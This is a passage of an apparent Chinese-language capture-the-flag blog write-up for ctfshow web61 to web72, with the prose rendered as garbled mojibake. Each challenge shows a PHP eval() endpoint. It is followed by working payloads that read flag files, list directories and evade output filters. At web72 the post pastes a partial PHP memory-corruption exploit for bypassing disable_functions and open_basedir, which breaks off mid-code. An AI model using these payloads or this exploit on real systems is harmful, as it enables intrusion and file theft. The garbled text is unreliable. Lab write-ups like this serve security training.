class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web62"><a class="header-anchor" href="#web62">¬∂</a>web62</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web63"><a class="header-anchor" href="#web63">¬∂</a>web63</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web64"><a class="header-anchor" href="#web64">¬∂</a>web64</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web65"><a class="header-anchor" href="#web65">¬∂</a>web65</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web66"><a class="header-anchor" href="#web66">¬∂</a>web66</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Áªà‰∫éshow_source()Ë¢´Á¶ÅÊ≠¢‰∫ÜÔºåÊàë‰ª¨ÂØªÊâæÊñ∞ÁöÑËØªÂèñÊñá‰ª∂ÂáΩÊï∞ÔºåËøôÈáåÂèëÁé∞highlight_file()ÂèØ‰ª•ËøõË°å‰ΩøÁî®ÔºåÊûÑÈÄ†payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>ÁÑ∂ËÄå‚Ä¶<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/%7D_K%5DOYUZW9J8QDD0KB%5DHIZ9.png" alt=""><br>ËØ¥flag‰∏çÂú®flag.phpÈáåÔºåÊàë‰ª¨‰ΩøÁî®<code>?c=print_r(scandir(&quot;/&quot;));</code>ÊâìÂç∞‰∏Ä‰∏ãÊ†πÁõÆÂΩï<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/%28D9PGWP%29L2CRP%5DEV%24%29%7DC7JX.png" alt=""><br>ÂèëÁé∞Êúâ‰∏Ä‰∏™flag.txtÔºåÈÇ£Êàë‰ª¨Áõ¥Êé•ËØªÂèñ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/NE58%40V%40%5B0O10J%7BFU%60%5B9YX_Y.png" alt=""></p><h3 id="web67"><a class="header-anchor" href="#web67">¬∂</a>web67</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊâìÂç∞ÁõÆÂΩïÂèëÁé∞<code>print_r()</code>Ë¢´Á¶ÅÁî®‰∫ÜÔºåÈÇ£Êàë‰ª¨Êç¢Êàê<code>var_dump</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure><p>ÂèëÁé∞ËøòÊòØflag.txtÔºåÈÇ£Áõ¥Êé•‰∏äpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><h3 id="web68"><a class="header-anchor" href="#web68">¬∂</a>web68</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Êó†‰ª£Á†Å</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Â∫îËØ•ÊòØÂêßhighlight_file()ÁªôÁ¶ÅÁî®‰∫ÜÔºåÊâÄ‰ª•È°µÈù¢Ëøû‰ª£Á†ÅÈÉΩÊ≤°ÊúâÔºåÁõ¥Êé•Êä•ÈîôÔºåÂÖàÊü•ÁúãÁõÆÂΩï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure><p>ËøòÊòØflag.txtÔºåËøôÈáåhighlight_file()Ë¢´Á¶ÅÁî®ÔºåÊàë‰ª¨Êç¢Âè¶‰∏Ä‰∏™Ôºå‰ΩøÁî®include()ÂáΩÊï∞ÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><h3 id="web69"><a class="header-anchor" href="#web69">¬∂</a>web69</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‰æùÁÑ∂ÊòØhighlight_file()Ë¢´Á¶ÅÁî®‰∏çÊòæÁ§∫ÁöÑÊ∫êÁ†Å</span><br></pre></td></tr></table></figure><p>Êü•ÁúãÁõÆÂΩïÊó∂ÂèëÁé∞var_dumpË¢´Á¶ÅÁî®‰∫ÜÔºåÊâæ‰∫Ü‰∏Ä‰∏ãËµÑÊñôÂèëÁé∞Âá†ÁßçËØªÂèñÁõÆÂΩïÁöÑÊñπÂºè</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// ÂàóÂΩìÂâçÁõÆÂΩï</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// ÂàóÊ†πÁõÆÂΩï</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">$d=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==($f=readdir($d)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line">$d=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==($f=$d-&gt;read()))&#123;<span class="keyword">echo</span>$f.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line">$a=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $value)&#123;<span class="keyword">echo</span> $value.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><p>ÂâçÈù¢4‰∏™print_rÈÉΩË¢´Á¶ÅÁî®‰∫ÜÔºåÊàë‰ª¨‰ΩøÁî®ÂêéÈù¢Âõõ‰∏™‰ªªÊÑè‰∏Ä‰∏™ÈÉΩÂèØ‰ª•ÔºåÂéüÁêÜÊòØÈÄöËøáÈÅçÂéÜÊï∞ÁªÑÁöÑÂΩ¢ÂºèËøõË°åËØªÂèñ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞Ê†πÁõÆÂΩï‰∏ãËøòÊòØflag.txtÔºåÈÇ£Áõ¥Êé•‰∏äpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><h3 id="web70"><a class="header-anchor" href="#web70">¬∂</a>web70</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‰æùÁÑ∂ÊòØhighlight_file()Ë¢´Á¶ÅÁî®‰∏çÊòæÁ§∫ÁöÑÊ∫êÁ†Å</span><br></pre></td></tr></table></figure><p>ËØªÂèñÁõÆÂΩï</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure><p>‰∏äpayloadËé∑Âèñflag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><h3 id="web71"><a class="header-anchor" href="#web71">¬∂</a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ‰Ω†‰ª¨Âú®ÁÇ´ÊäÄÂêóÔºü</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Êú¨Êù•ËøôÊ¨°ÊÉ≥Áõ¥Êé•Áî®payloadËØªÂèñÁöÑÔºåÔºåÁªìÊûúüò¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/QN%29C%4081NPQF~C%5B5%60%7DI%402GMU.png" alt=""><br>ËæìÂá∫‰∫Ü‰∏ÄÂ†Ü<code>?</code>Âè∑ÔºåÁúãÂà∞Ê∫êÁ†Å‰∏≠ÊúÄÂêéÊúâ‰∏™ÂåπÈÖçÔºåÂåπÈÖçÂà∞Êï∞Â≠óÂ≠óÊØçÂ∞±‰ºöË¢´ÊõøÊç¢Êàê<code>?</code>Âè∑Ôºå‰∏çËøáÂõ†‰∏∫Ëøô‰∏™ËØ≠Âè•ÊòØÊîæÂú®eval()ÂáΩÊï∞ÂêéÈù¢ÁöÑÔºåÊàë‰ª¨Áõ¥Êé•Âä†‰∏™Âº∫Ë°åÈÄÄÂá∫ÂëΩ‰ª§Âç≥ÂèØÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/JJ%293IANL3BY%60LF9W2FOS%40JF.png" alt=""></p><h3 id="web72"><a class="header-anchor" href="#web72">¬∂</a>web72</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¶ñÂÖàÁªßÁª≠ÂÖàÊü•ÁúãÁõÆÂΩïÔºå‰∏äÈ¢òÁöÑpaylaod‰∏çËÉΩÁî®‰∫ÜÔºåÁªßÁª≠Êç¢ÂàöÂàöÂàó‰∏æÂá∫Êù•ÁöÑÂè¶‰∏Ä‰∏™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web72/%28%296EFGFX3J%5BND58%256%7D5%281%60J.png" alt=""><br>ÂèëÁé∞ÊîπÂêçÂ≠ó‰∫ÜÔºåflagÂú®flag0.txtÔºåÁªßÁª≠includeÊâßË°åÂç¥ÂèëÁé∞Ë¢´Á¶ÅÁî®‰∫ÜÔºåÊé•ÁùÄÊÇ≤ÂÇ¨ÁöÑÂèëÁé∞ËøôÈ¢òÊúâopen_basedirÂíådisable_functionsÁöÑÈôêÂà∂</p><blockquote><p>open_basedirÔºöÂ∞ÜPHPÊâÄËÉΩÊâìÂºÄÁöÑÊñá‰ª∂ÈôêÂà∂Âú®ÊåáÂÆöÁöÑÁõÆÂΩïÊ†ë‰∏≠ÔºåÂåÖÊã¨Êñá‰ª∂Êú¨Ë∫´„ÄÇÂΩìÁ®ãÂ∫èË¶Å‰ΩøÁî®‰æãÂ¶Çfopen()Êàñfile_get_contents()ÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåËøô‰∏™Êñá‰ª∂ÁöÑ‰ΩçÁΩÆÂ∞Ü‰ºöË¢´Ê£ÄÊü•„ÄÇÂΩìÊñá‰ª∂Âú®ÊåáÂÆöÁöÑÁõÆÂΩïÊ†ë‰πãÂ§ñÔºåÁ®ãÂ∫èÂ∞ÜÊãíÁªùÊâìÂºÄ</p><p>disable_functionsÔºöÁî®‰∫éÁ¶ÅÊ≠¢Êüê‰∫õÂáΩÊï∞Ôºå‰πüÂ∞±ÊòØÈªëÂêçÂçïÔºåÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØphp‰∏∫‰∫ÜÈò≤Ê≠¢Êüê‰∫õÂç±Èô©ÂáΩÊï∞ÊâßË°åÁªôÂá∫ÁöÑÈÖçÁΩÆÈ°πÔºåÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰∏∫Á©∫</p></blockquote><p>ÁÑ∂ÂêéÊÉ≥‰∏äËöÅÂâë‰πüÊ≤°ÊúâbypassÊàêÂäüÔºåÂéªÁΩë‰∏äÊêú‰∫Ü‰∏Ä‰∏ãÂèØÂà©Áî®ÁöÑexpÔºåÊ≠£Â•ΩÁæ§‰∏ªÊúâÁé∞ÊàêÁöÑÂèëÂá∫Êù•ÔºåÁõ¥Êé•ÊãøÊù•Áî®<br>expÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(<span class="string">&quot;%c&quot;</span>,($ptr &amp; <span class="number">0xff</span>));</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(<span class="string">&quot;%c&quot;</span>,($v &amp; <span class="number">0xff</span>));</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = 